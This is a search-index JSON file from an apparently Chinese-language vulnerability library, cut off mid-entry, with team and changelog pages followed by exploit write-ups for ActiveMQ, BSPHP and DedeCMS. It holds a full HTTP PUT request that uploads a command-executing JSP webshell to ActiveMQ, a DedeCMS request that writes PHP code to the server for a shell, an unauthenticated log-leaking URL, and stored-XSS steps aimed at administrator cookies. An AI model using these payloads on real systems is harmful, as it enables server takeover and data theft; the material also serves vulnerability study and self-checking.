{"config":{"lang":["ja"],"separator":"[\\uff0c\\u3002]+","pipeline":["trimmer","stemmer"]},"docs":[{"location":"%E5%9B%A2%E9%98%9F%E7%AE%80%E4%BB%8B/","title":"\u56e2\u961f\u7b80\u4ecb","text":""},{"location":"%E5%9B%A2%E9%98%9F%E7%AE%80%E4%BB%8B/#_1","title":"\u56e2\u961f\u7b80\u4ecb","text":"<p>\u7f51\u7edc\u5b89\u5168\u56e2\u961f\u521b\u5efa\u4e8e2020\u5e748\u6708\uff0c\u7531\u5b89\u5168\u884c\u4e1a\u7231\u597d\u8005\u7ec4\u6210\u3002\u56e2\u961f\u7684\u6838\u5fc3\u601d\u60f3\uff0c\u5f00\u6e90\uff0c\u516c\u76ca\uff0c\u5171\u4eab\u3002</p> <p>\u6280\u672f\u8fdc\u79bb\u6761\u6761\u6846\u6846\uff0c\u6211\u4eec\u4e00\u76f4\u90fd\u5728\u8def\u4e0a\u3002</p> <p>\u626b\u63cf\u4e8c\u7ef4\u7801\uff0c\u5173\u6ce8\u6211\u4eec</p> <p></p>"},{"location":"%E5%9B%A2%E9%98%9F%E7%AE%80%E4%BB%8B/#_2","title":"\u6587\u5e93\u7b80\u4ecb","text":"<p>\u65e9\u671f\u5b89\u5168\u6280\u672f\u5708\u73af\u5883\u5c01\u95ed\uff0c\u5272\u97ed\u83dc\u4e4b\u98ce\u76db\u884c\u3002\u4e3a\u5b9e\u73b0\u6280\u672f\u5171\u4eab\uff0c\u4ea4\u6d41\u4fbf\u5229\uff0c2020\u5e746\u6708\u6f0f\u6d1e\u6587\u6863\u5e94\u8fd0\u800c\u751f\uff0c\u4e3b\u8981\u6536\u96c6\u4e92\u8054\u7f51\u516c\u5f00\u7684\u9ad8\u98ce\u9669\u6f0f\u6d1ePOC/EXP\uff0c\u4f7f\u4f01\u4e1a\u81ea\u67e5\u6f0f\u6d1e\u66f4\u52a0\u4fbf\u5229\uff0c\u767d\u5e3d\u5b50\u4eec\u53ef\u4ee5\u66f4\u52a0\u7701\u5fc3\u4fdd\u536b\u56fd\u5bb6\u7f51\u7edc\u5b89\u5168\u3002</p>"},{"location":"%E5%9B%A2%E9%98%9F%E7%AE%80%E4%BB%8B/#_3","title":"\u5408\u4f5c\u4f19\u4f34","text":""},{"location":"%E5%9B%A2%E9%98%9F%E7%AE%80%E4%BB%8B/#_4","title":"\u6295\u7a3f\u65b9\u5f0f","text":""},{"location":"%E5%9B%A2%E9%98%9F%E7%AE%80%E4%BB%8B/#_5","title":"\u6295\u7a3f\u5730\u5740","text":"<p>kukuqi666@gmail.com</p>"},{"location":"%E5%9B%A2%E9%98%9F%E7%AE%80%E4%BB%8B/#_6","title":"\u6295\u7a3f\u5185\u5bb9\u8981\u6c42","text":"<p>\u6587\u5e93\u76ee\u524d\u4ec5\u6536\u5f55\u8fd1\u51e0\u5e74\u5185\u201c\u8f83\u65b0\u201d\u7684\u6f0f\u6d1e\uff0c\u5c3d\u53ef\u80fd\u7684\u4fdd\u8bc1\u6587\u5e93\u4f7f\u7528\u65f6\u7684\u5b9e\u7528\u6027\u3002\u8f83\u8fdc\u65f6\u671f\u4f8b\u59825\u5e74\u524d\u7684\u6f0f\u6d1e\u5c06\u4e0d\u518d\u6536\u5f55\u3002</p>"},{"location":"%E5%9B%A2%E9%98%9F%E7%AE%80%E4%BB%8B/#_7","title":"\u8d21\u732e\u6587\u6863\u8981\u6c42","text":"<p>\u5f53\u4f60\u6253\u7b97\u8d21\u732e\u67d0\u90e8\u5206\u7684\u5185\u5bb9\u65f6\uff0c\u4f60\u5e94\u8be5\u5c3d\u91cf\u786e\u4fdd</p> <ul> <li>\u6587\u6863\u5185\u5bb9\u6ee1\u8db3\u57fa\u672c\u683c\u5f0f\u8981\u6c42</li> <li>\u6587\u6863\u7684\u5408\u7406\u6027\u4ee5\u53ca\u51c6\u786e\u6027</li> <li>\u6587\u6863\u56fe\u7247\u4ee5\u53ca\u9644\u4ef6\u7684\u5b58\u50a8\u683c\u5f0f</li> </ul>"},{"location":"%E5%9B%A2%E9%98%9F%E7%AE%80%E4%BB%8B/#_8","title":"\u6587\u6863\u5b58\u50a8\u683c\u5f0f","text":"<p>1.\u76ee\u524d\u4ed3\u5e93\u53ea\u63a5\u53d7 Markdown \u683c\u5f0f\u7684\u8d21\u732e\u63d0\u4ea4\uff0c\u5982\u679c\u6709\u5176\u4ed6\u683c\u5f0f\u7684\u63d0\u4ea4\u8bf7\u8054\u7cfb\u6211\u4eec\u8fdb\u884c\u8f6c\u6362\u3002</p> <p>2.\u6587\u7ae0\u5185\u56fe\u7247\u5b58\u50a8\u8981\u6c42\uff1a\u5982\u679c\u6587\u7ae0\u5185\u6709\u56fe\u7247\u6f14\u793a\u7b49\uff0c\u5e94\u5c06\u56fe\u7247\u653e\u5728\u672c\u5730\uff0c\u907f\u514d\u4f7f\u7528\u5916\u94fe\u3002\u63a8\u8350\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u8fdb\u884c\u56fe\u7247\u7d22\u5f15\u94fe\u63a5\uff0c\u590d\u5236\u56fe\u7247\u5230\u4e0e\u5f53\u524d\u6587\u6863\u540c\u540d\u7684\u6587\u4ef6\u5939\u4e0b\uff0c\u6216\u53ef\u76f4\u63a5\u5728 MarkDown \u8f6f\u4ef6\u4e2d\u8bbe\u7f6e\u590d\u5236\u56fe\u7247\u5230\u6307\u5b9a\u8def\u5f84\uff0c\u56fe\u7247\u5b58\u50a8\u4f4d\u7f6e\u7b56\u7565\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>./${filename}\n</code></pre> <p>\u5176\u4e2d <code>./${filename}</code> \u8868\u793a\u5f53\u524d\u6587\u4ef6\u540d\uff0c\u5177\u4f53\u6848\u4f8b\u6f14\u793a\u5982\u4e0b\uff1a</p> <p>\u5047\u8bbe\u6211\u6709\u4e00\u7bc7\u540d\u4e3a<code>xss \u6280\u672f\u603b\u7ed3.md</code> \u7684\u6587\u7ae0\uff0c\u91cc\u9762\u6709\u82e5\u5e72\u56fe\u7247\uff0c\u90a3\u4e48\u56fe\u7247\u5e94\u8be5\u5b58\u50a8\u5728 <code>xss \u6280\u672f\u603b\u7ed3</code> \u8fd9\u4e2a\u6587\u4ef6\u5939\u5185\uff0c\u63d0\u4ea4\u65f6\u5e94\u5f53\u5c06\u6b64\u6587\u4ef6\u5939\u548c .md \u6587\u4ef6\u4e00\u540c\u63d0\u4ea4\u3002</p>"},{"location":"%E5%9B%A2%E9%98%9F%E7%AE%80%E4%BB%8B/#_9","title":"\u793a\u4f8b","text":""},{"location":"%E5%9B%A2%E9%98%9F%E7%AE%80%E4%BB%8B/#_10","title":"\u76f8\u5173\u8bf4\u660e","text":"<p>\u6f0f\u6d1e\u6587\u6863\u5747\u6765\u81ea\u7f51\u7edc\u6587\u7ae0\u7efc\u5408\u3001\u56e2\u961f\u539f\u521b\u4ee5\u53ca\u767d\u5e3d\u5b50\u6295\u7a3f\uff0c\u5bf9\u4e8e\u6709\u53ef\u6eaf\u6765\u6e90\u7684\u6587\u7ae0\u6211\u4eec\u5c06\u4f1a\u6ce8\u660e\u6765\u6e90\uff0c\u5bf9\u5f15\u7528\u53c2\u8003\u5185\u5bb9\u7684\u6587\u7ae0\uff0c\u6211\u4eec\u5c06\u4f1a\u5728\u6bcf\u7bc7\u6587\u7ae0\u672b\u6807\u6ce8\u5f15\u7528\u53c2\u8003\u6765\u6e90\u3002\u5982\u6709\u6587\u7ae0\u6765\u6e90\u548c\u53c2\u8003\u94fe\u63a5\u66f4\u65b0\u4e0d\u53ca\u65f6\u7684\u60c5\u51b5\uff0c\u8bf7\u5404\u4f4d\u53ca\u65f6\u6279\u8bc4\u6307\u6b63\u3002</p>"},{"location":"%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/","title":"\u66f4\u65b0\u65e5\u5fd7","text":""},{"location":"%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/#20240806","title":"2024\u5e7408\u670806\u65e5","text":"<p>\u66f4\u65b0\u6f0f\u6d1e\u4ed3\u5e93</p>"},{"location":"%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/#20230218","title":"2023\u5e7402\u670818\u65e5","text":"<p>\u66f4\u65b0\u901f\u67e5\u8868\u3001\u77e5\u8bc6\u5e93\u3001\u6f0f\u6d1e\u5e93\u7b49\u5185\u5bb9\u6a21\u5757</p>"},{"location":"%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/#20220202","title":"2022\u5e7402\u670802\u65e5","text":"<p>\u4e3b\u9898\u7f8e\u5316\u3002</p>"},{"location":"%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/#20201027","title":"2020\u5e7410\u670827\u65e5","text":"<p>\u6f0f\u6d1e\u6587\u6863\u6b63\u5f0f\u4e0a\u7ebf\uff0c\u6846\u67b6\u66f4\u65b0\u4e3a mkdoc\uff0c\u540c\u65f6\u90e8\u7f72\u4e86 \u56fd\u5185CDN \u8282\u70b9\u4f18\u5316\u8bbf\u95ee\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ActiveMQ/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"ActiveMQ\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ActiveMQ/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#activemq","title":"ActiveMQ\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":"<p>\u8be5\u6f0f\u6d1e\u51fa\u73b0\u5728fileserver\u5e94\u7528\u4e2d\uff0cActiveMQ\u4e2d\u7684fileserver\u670d\u52a1\u5141\u8bb8\u7528\u6237\u901a\u8fc7HTTP  PUT\u65b9\u6cd5\u4e0a\u4f20\u6587\u4ef6\u5230\u6307\u5b9a\u76ee\u5f55\u3002Fileserver\u652f\u6301\u5199\u5165\u6587\u4ef6(\u4e0d\u89e3\u6790jsp),\u4f46\u662f\u652f\u6301\u79fb\u52a8\u6587\u4ef6(Move)\u6211\u4eec\u53ef\u4ee5\u5c06jsp\u7684\u6587\u4ef6PUT\u5230Fileserver\u4e0b,\u7136\u540e\u518d\u901a\u8fc7Move\u6307\u4ee4\u79fb\u52a8\u5230\u53ef\u6267\u884c\u76ee\u5f55\u4e0b\u8bbf\u95ee</p> <p>\u4f7f\u7528vulhub\u4e00\u952e\u642d\u5efa\uff0c\u9776\u673akali\uff1a192.168.1771.37</p> <pre><code>docker-compose up -d\n</code></pre> <p>\u73af\u5883\u642d\u5efa\u6210\u529f\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\uff1ahttp://IP:8161</p> <p></p> <p></p> <p>\u767b\u5f55admin\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7admin/admin\uff0c\u6293\u5305\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u7528PUT\u65b9\u6cd5\u4e0a\u4f20\u6587\u4ef6\u3002ActiveMQ  Web\u63a7\u5236\u53f0\u5206\u4e3a\u4e09\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff1a\u5176\u4e2dadmin\uff0capi\u548cfileserver\uff0c\u5176\u4e2dadmin\u662f\u7ba1\u7406\u5458\u9875\u9762\uff0capi\u662f\u754c\u9762\uff0cfileserver\u662f\u7528\u4e8e\u5b58\u50a8\u6587\u4ef6\u7684\u754c\u9762\uff1badmin\u548capi\u9700\u8981\u5148\u767b\u5f55\u624d\u80fd\u4f7f\u7528\uff0cfileserver\u4e0d\u9700\u8981\u767b\u5f55\u3002</p> <p>\u4e0a\u4f20jsp\u6587\u4ef6\uff08\u7cfb\u7edf\u4e0d\u7a33\u5b9a\uff0c\u6709\u65f6\u6210\u529f\u6709\u65f6\u5931\u8d25\uff09\uff0c</p> <p> <pre><code>PUT /fileserver/2.jsp HTTP/1.1\nHost: 192.168.177.137:8161\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nDNT: 1\nCookie: JSESSIONID=18wws8yzr1a04iz9gfpkkar3p\nAuthorization: Basic YWRtaW46YWRtaW4=\nX-Forwarded-For: 8.8.8.8\nConnection: close\nContent-Length: 329\n\n&lt;%@ page import=\"java.io.*\"%&gt;\n&lt;%\n out.print(\"Hello&lt;/br&gt;\");\n String strcmd=request.getParameter(\"cmd\");\n String line=null;\n Process p=Runtime.getRuntime().exec(strcmd);\n BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));\n while((line=br.readLine())!=null){\n out.print(line+\"&lt;/br&gt;\");\n }\n%&gt;\n</code></pre></p> <p>\u4f7f\u7528MOVE\u65b9\u6cd5\u79fb\u52a8\u6587\u4ef6\uff0c\u6210\u529f\u7684\u5305\u6ca1\u622a\u4e0a\uff0c\u518d\u6b21\u4e0a\u4f20\u662f500\u56de\u663e\uff0c\u6587\u4ef6\u5df2\u7ecf\u4e0a\u4f20\u6210\u529f\uff0c\u8bbf\u95ee\u5730\u5740\uff0c\u6210\u529f\u89e3\u6790jsp</p> <p></p> <p>\u4f7f\u7528MOVE\u65b9\u6cd5\u79fb\u52a8\u6587\u4ef6\uff0c\u6210\u529f\u7684\u5305\u6ca1\u622a\u4e0a\uff0c\u518d\u6b21\u4e0a\u4f20\u662f500\u56de\u663e\uff0c\u6587\u4ef6\u5df2\u7ecf\u4e0a\u4f20\u6210\u529f\uff0c\u8bbf\u95ee\u5730\u5740\uff0c\u6210\u529f\u89e3\u6790jsp</p> <p></p> <p></p> <p>\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff1aApache ActiveMQ 5.x ~ 5.14.0</p> <p>1\u3001ActiveMQ Fileserver \u7684\u529f\u80fd\u5728 5.14.0 \u53ca\u5176\u4ee5\u540e\u7684\u7248\u672c\u4e2d\u5df2\u88ab\u79fb\u9664\u3002\u5efa\u8bae\u7528\u6237\u5347\u7ea7\u81f3 5.14.0 \u53ca\u5176\u4ee5\u540e\u7248\u672c\u3002</p> <p>2\u3001\u901a\u8fc7\u79fb\u9664 <code>conf\\jetty.xml</code> \u7684\u4ee5\u4e0b\u914d\u7f6e\u6765\u7981\u7528 ActiveMQ Fileserver \u529f\u80fd</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/","title":"BSPHP\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee","text":"<p>\u8be5\u5904\u6cc4\u6f0f\u7684\u2f64\u6237\u540d\u548c\u7528\u6237\u767b\u9646 IP</p> <p>URL\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>http://127.0.0.1/admin/index.php?m=admin&amp;c=log&amp;a=table_json&amp;json=get&amp;soso_ok=1&amp;t=user_login_log&amp;page=1&amp;limit=10&amp;\n</code></pre> <p>\u76f4\u63a5\u8fdb\u884c\u8bbf\u95ee\u5373\u53ef\u83b7\u5f97\u5982\u4e0b\u6570\u636e</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"DedeCMS V5.7 SP2\u540e\u53f0\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u5f71\u54cd\u7248\u672c","text":"<p>DedeCMS V5.7 SP2</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>\u7ec7\u68a6\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf(Dedecms)\u662f\u4e00\u6b3ePHP\u5f00\u6e90\u7f51\u7ad9\u7ba1\u7406\u7cfb\u7edf\u3002Dedecms V5.7 SP2\u7248\u672c\u4e2d\u7684tpl.php\u4e2d\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e,\u53ef\u4ee5\u901a\u8fc7\u8be5\u6f0f\u6d1e\u5728\u589e\u52a0\u65b0\u6807\u7b7e\u4e2d\u4e0a\u4f20\u6728\u9a6c,\u83b7\u53d6webshell\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u767b\u5f55\u540e\u53f0,\u5e76\u4e14\u540e\u53f0\u7684\u8d26\u6237\u6743\u9650\u662f\u7ba1\u7406\u5458\u6743\u9650\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>\u9ed8\u8ba4\u540e\u53f0\u5730\u5740 <code>/dede/</code>\uff0c\u6587\u4ef6 <code>dede/tpl.php</code> \u4e2d\u7684251\u5230281\u884c\u3002</p> <pre><code>csrf_check();\n    #filename\u548c\u524d\u9762\u6b63\u5219\u7684\u5339\u914d\u60c5\u51b5\n    if(!preg_match(\"#^[a-z0-9_-]{1,}\\.lib\\.php$#i\", $filename))\n    {\n        ShowMsg('\u6587\u4ef6\u540d\u4e0d\u5408\u6cd5\uff0c\u4e0d\u5141\u8bb8\u8fdb\u884c\u64cd\u4f5c\uff01', '-1');\n        exit();\n    }\n    require_once(DEDEINC.'/oxwindow.class.php');\n    #\u641c\u7d22filename\u4e2d\u5339\u914d`\\.lib\\.php$#i`\u7684\u90e8\u5206\uff0c\u4ee5\u7a7a\u683c\u4ee3\u66ff\n    $tagname = preg_replace(\"#\\.lib\\.php$#i\", \"\", $filename);\n    #\u53bb\u6389\u53cd\u659c\u53f7\n    $content = stripslashes($content);\n    #\u62fc\u63a5\u6587\u4ef6\u540d\n    $truefile = DEDEINC.'/taglib/'.$filename;\n    #\u5199\u5165\u5185\u5bb9\n    $fp = fopen($truefile, 'w');\n    fwrite($fp, $content);\n    fclose($fp);\n</code></pre> <p>replace\u5904\u7406\u4e4b\u540e\u8d4b\u503c\u7ed9\u53d8\u91cf \\(tagname \u3002\u4f46\u662f\u5199\u5165\u6587\u4ef6\u7684\u65f6\u5019\u5e76\u6ca1\u6709\u7528\u5230\\)tagname \u3002 \u90a3\u4e3a\u4ec0\u4e48\u6709\u8fd9\u4e2a$tagname\uff0c\u62fc\u63a5\u6587\u4ef6\u540d\u7684\u65f6\u5019\uff0c\u5e94\u8be5\u662f\u62fc\u63a5<code>tagname</code></p> <p>\u5229\u7528</p> <pre><code>1.\u7531\u4e8ededecms\u5168\u5c40\u53d8\u91cf\u6ce8\u518c\u7684\u7279\u6027\uff0c\u6240\u4ee5\u8fd9\u91cc\u7684content\u53d8\u91cf\u548cfilename\u53d8\u91cf\u53ef\u63a7\u3002\n\n2.\u53ef\u4ee5\u770b\u5230\u5c06content\u76f4\u63a5\u5199\u5165\u5230\u6587\u4ef6\u4e2d\u5bfc\u81f4\u53ef\u4ee5getshell\u3002\u4f46\u662f\u8fd9\u91cc\u7684\u6587\u4ef6\u540d\u7ecf\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u5fc5\u987b\u8981.lib.php\u7ed3\u5c3e\u3002\n\n3.\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2acsrf_check()\u51fd\u6570\uff0c\u5373\u8bf7\u6c42\u4e2d\u5fc5\u987b\u8981\u5e26token\u53c2\u6570\u3002\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","title":"\u6f0f\u6d1e\u5229\u7528","text":"<ol> <li> <p>\u9996\u5148\u83b7\u53d6<code>token</code>\u3002\u8bbf\u95ee\u57df\u540d + <code>/dede/tpl.php?action=upload</code></p> <p>http://127.0.0.1/uploads/dede/tpl.php?action=upload</p> <p>\u901a\u8fc7\u67e5\u770b\u9875\u9762\u6e90\u7801\u5373\u53ef\u83b7\u5f97 token</p> </li> </ol> <p></p> <p>2.\u7136\u540e\u8bbf\u95ee </p> <pre><code>http://127.0.0.1/dede/tpl.php?filename=secnote.lib.php&amp;action=savetagfile&amp;content=&lt;?php phpinfo();?&gt;&amp;token=\u4f60\u7684token\u503c\n</code></pre> <p>shell \u5730\u5740</p> <pre><code>http://127.0.0.1/include/taglib/secnote.lib.php\n</code></pre> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_5","title":"\u53c2\u8003\u6765\u6e90","text":"<p>DedeCMS V5.7 SP2\u540e\u53f0\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff1ahttp://www.freebuf.com/vuls/164035.html</p> <p>Dede CMS \u4e0b\u8f7d\u4e2d\u5fc3\uff1ahttp://www.dedecms.com/products/dedecms/downloads/</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/","title":"DedeCMS_v5.7_carbuyaction_\u5b58\u50a8\u578bXSS","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#affected-version","title":"Affected Version","text":"<p>DedeCMS-V5.7-UTF8-SP2  \uff08 \u53d1\u5e03\u65e5\u671f  2017-03-15 \uff09</p> <p>\u9700\u8981\u7ad9\u70b9\u542f\u7528\u5546\u57ce\u529f\u80fd\u3002</p> <p>\u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5: https://pan.baidu.com/s/1bprjPx1 \u5bc6\u7801: mwdq</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#poc","title":"PoC","text":"<p>\u8be5\u6f0f\u6d1e \u901a\u8fc7\u7528\u6237\u5728\u7f16\u5199\u8ba2\u5355\u6536\u8d27\u5730\u5740\u7684\u76f8\u5173\u53c2\u6570 \u6ce8\u5165 XSS Payload\uff0c\u5bfc\u81f4 \u524d\u53f0\u67e5\u770b\u8ba2\u5355\u7684\u9875\u9762\u548c\u540e\u53f0\u7ba1\u7406\u5458\u67e5\u770b\u8ba2\u5355\u8be6\u60c5\u7684\u9875\u9762\u90fd\u4f1a\u88ab XSS\u3002</p> <p>\u6240\u4ee5\u8bf4\uff0c\u53ef\u4ee5\u7528\u6765\u6253\u7ba1\u7406\u5458 Cookie \u3002</p> <p>\u6d4b\u8bd5\uff1a</p> <ol> <li>\u9996\u5148\u7ba1\u7406\u5458\u6dfb\u52a0\u4e00\u9879\u5546\u57ce\u7684\u5546\u54c1</li> </ol> <p></p> <ol> <li>\u524d\u53f0\u7528\u6237\u9009\u5b9a\u5546\u54c1\u6dfb\u52a0\u8d2d\u7269\u8f66</li> </ol> <p></p> <ol> <li>\u524d\u53f0\u7528\u6237\u7f16\u8f91\u8ba2\u5355\u7684\u6536\u8d27\u5730\u5740\uff0c\u5728\u8fd9\u91cc address,des,email,postname \u90fd\u662f\u5b58\u5728 XSS \u7684\uff0c\u63d2\u5165 XSS Payload</li> </ol> <p></p> <ol> <li>\u67e5\u770b\u8ba2\u5355\u8be6\u60c5\u53d1\u73b0\u524d\u53f0\u5df2\u7ecf\u88ab XSS</li> </ol> <p></p> <ol> <li>\u7ba1\u7406\u5458\u8fdb\u5165\u540e\u53f0\u67e5\u770b\u5546\u57ce\u8ba2\u5355\u540c\u6837\u4e5f\u4f1a\u88ab XSS  :p</li> </ol> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#references","title":"References","text":"<ol> <li>https://www.seebug.org/vuldb/ssvid-92855</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_shops_delivery_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/","title":"DedeCMS_v5.7_shops_delivery_\u5b58\u50a8\u578bXSS","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_shops_delivery_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#affected-version","title":"Affected Version","text":"<p>DedeCMS-V5.7-UTF8-SP2  \uff08 \u53d1\u5e03\u65e5\u671f  2017-03-15 \uff09</p> <p>\u9700\u8981\u7ad9\u70b9\u542f\u7528\u5546\u57ce\u529f\u80fd\u3002</p> <p>\u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5: https://pan.baidu.com/s/1bprjPx1 \u5bc6\u7801: mwdq</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_shops_delivery_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#poc","title":"PoC","text":"<p>\u8be5\u6f0f\u6d1e\u6bd4\u8f83\u9e21\u808b\uff0c\u9700\u8981\u767b\u5f55 \u7ba1\u7406\u5458\u540e\u53f0\u901a\u8fc7 \u6dfb\u52a0\u914d\u9001\u65b9\u5f0f \u529f\u80fd \uff0c\u6dfb\u52a0\u540e\u5728\u524d\u540e\u53f0\u90fd\u4f1a\u89e6\u53d1 \u5b58\u50a8\u578b XSS</p> <p>\u4e4b\u6240\u4ee5\u4f1a\u89e6\u53d1\u662f\u56e0\u4e3a\u5728\u7cfb\u7edf\u5bf9 \u7ba1\u7406\u5458\u8f93\u5165\u7684 \u914d\u9001\u65b9\u5f0f-\u63cf\u8ff0\u5b57\u6bb5\uff08des\uff09\u5728\u5165\u5e93\u524d\u53ea\u8fdb\u884c addslashes \u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26\u5904\u7406\uff0c\u5176\u5b9e\u8fd9\u6ca1\u6bdb\u75c5</p> <p>\u91cd\u8981\u7684\u662f\u53d6\u51fa\u6570\u636e\u5e93\u7684\u6570\u636e\u8f93\u51fa\u5230\u9875\u9762\u524d\u6ca1\u8fdb\u884c HTML \u5b9e\u4f53\u7f16\u7801\u5904\u7406\u76f4\u63a5\u8f93\u51fa\u5bfc\u81f4\u6700\u7ec8\u7684 XSS</p> <p>\u6d4b\u8bd5\uff1a</p> <ol> <li>\u540e\u53f0\u6dfb\u52a0 \u914d\u9001\u65b9\u5f0f</li> </ol> <p></p> <ol> <li>\u6dfb\u52a0\u6210\u529f\u540e\u76f4\u63a5\u5c55\u793a\u914d\u9001\u65b9\u5f0f\u5217\u8868\uff0c\u89e6\u53d1 XSS</li> </ol> <p></p> <ol> <li>\u6b64\u5916\uff0c\u8fd9\u4e2a XSS \u5728\u524d\u53f0\u7528\u6237\u8d2d\u4e70\u4e1c\u897f\u9009\u62e9\u914d\u9001\u65b9\u5f0f\u7684\u65f6\u5019\u4e5f\u4f1a\u89e6\u53d1</li> </ol> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_shops_delivery_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#references","title":"References","text":"<ol> <li>https://www.seebug.org/vuldb/ssvid-92863</li> 